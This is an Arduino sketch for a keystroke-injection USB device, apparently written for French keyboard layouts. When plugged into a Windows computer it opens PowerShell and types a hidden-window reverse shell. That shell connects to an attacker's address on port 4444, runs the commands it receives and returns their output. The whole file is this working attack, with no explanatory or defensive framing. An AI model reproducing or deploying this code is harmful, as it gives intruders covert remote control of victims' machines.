#include <Keyboard.h>

void pressKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  //delay for debugging or safety
  delay(5000); 

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(200);

  //open powershell in admin mode
  Keyboardprint("powershell");
  delay(500);
  pressKey(KEY_RETURN);
  delay(1000);
  
  //powershell reverse shell script
  Keyboardprint("powershell.exe -windowstyle hidden");
  printCA(1,33);
  keyboardScanCode(48);
  Keyboardprint("client = New-Object System.Net.Sockets.TCPClient(\"0.0.0.0\",4444);"); //ip of the attack and port 
  keyboardScanCode(48);
  Keyboardprint("stream = ");
  keyboardScanCode(48);
  Keyboardprint("client.GetStream();"); 
  
  printCA(1,34);
  Keyboardprint("byte");
  printCA(1,34);
  printCA(1,45);
  printCA(1,45);
  keyboardScanCode(48);
  Keyboardprint("bytes = 0..65535");
  printCA(1,35);
  Keyboardprint("%");
  printCA(1,33);
  Keyboardprint("0");
  printCA(1,46);
  Keyboardprint(";while((");
  keyboardScanCode(48);
  Keyboardprint("i = ");
  keyboardScanCode(48);
  Keyboardprint("stream.Read(");
  keyboardScanCode(48);
  Keyboardprint("bytes, 0, ");
  keyboardScanCode(48);
  Keyboardprint("bytes.Length)) -ne 0)");
  
  printCA(1,33);
  Keyboardprint(";");
  keyboardScanCode(48);
  Keyboardprint("data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(");
  keyboardScanCode(48);
  Keyboardprint("bytes,0, ");
  keyboardScanCode(48);
  Keyboardprint("i);");
  keyboardScanCode(48);
  Keyboardprint("sendback = (iex "); 
  keyboardScanCode(48);
  Keyboardprint("data 2");
  printMaj(1,100); //print '>'
  Keyboardprint("&1 ");
  printCA(1,35);
  Keyboardprint(" Out-String );");
  keyboardScanCode(48);
  Keyboardprint("sendback2 = "); 
  keyboardScanCode(48);
  Keyboardprint("sendback "); 
  printMaj(1,46);
  Keyboardprint(" ");
  keyboardScanCode(33);
  Keyboardprint("ReverseShell"); 
  printCA(1,32);
  keyboardScanCode(33);
  Keyboardprint(";");
  keyboardScanCode(48);
  Keyboardprint("sendbyte = (");
  printCA(1,34);
  Keyboardprint("text.encoding");
  printCA(1,45);
  Keyboardprint("::ASCII).GetBytes(");
  keyboardScanCode(48);
  Keyboardprint("sendback2);");
  keyboardScanCode(48);
  Keyboardprint("stream.Write(");
  keyboardScanCode(48);
  Keyboardprint("sendbyte,0,");
  keyboardScanCode(48);
  Keyboardprint("sendbyte.Length);");
  keyboardScanCode(48);
  Keyboardprint("stream.Flush()");
  printCA(1,46);
  Keyboardprint(";");
  keyboardScanCode(48);
  Keyboardprint("client.Close()"); 
  printCA(1,46);
  delay(300);

  pressKey(KEY_RETURN);
  // Ending stream */
  Keyboard.end();
}

void Keyboardprint(String text)
{
  text=fr2en(text);
  int n=text.length();
  for(int i=0;i<n;i++)
  {
      Keyboard.print(text[i]);
  }
}

String fr2en(String text)
{
  int i = 0;
  String _en = " =qwertyuiopasdfghjkl;zxcvbnQWERTYUIOPASDFGHJKL:ZXCVBNm,./M<>?1234567890!@#$%^&*()\"-",
         _fr = " =azertyuiopqsdfghjklmwxcvbnAZERTYUIOPQSDFGHJKLMWXCVBN,;:!?./ & \"'(- _  1234567890%)",
         str = "";
  while (text[i] != 0){
    str = str + (String)_en[_fr.indexOf((String)text[i++])];
  }
  return str;
}


void keyboardScanCode(byte code)
{  
  Keyboard.press(code+136);  
  delay(4);  
  Keyboard.release(code+136);  
  delay(4); 
}

void printCA(int n, int s)
{    
  for (int i=0;i<n;i++)
  {
    Keyboard.press(KEY_LEFT_CTRL);  
    Keyboard.press(KEY_LEFT_ALT);  
    keyboardScanCode(s);  
    Keyboard.release(KEY_LEFT_ALT);  
    Keyboard.release(KEY_LEFT_CTRL);
  }
}

void printMaj(int n, int s)
{
  for (int i=0;i<n;i++)
  {
    Keyboard.press(KEY_LEFT_SHIFT);  
    keyboardScanCode(s);  
    Keyboard.release(KEY_LEFT_SHIFT);  
  }
}



/* Unused endless loop */
void loop() {}
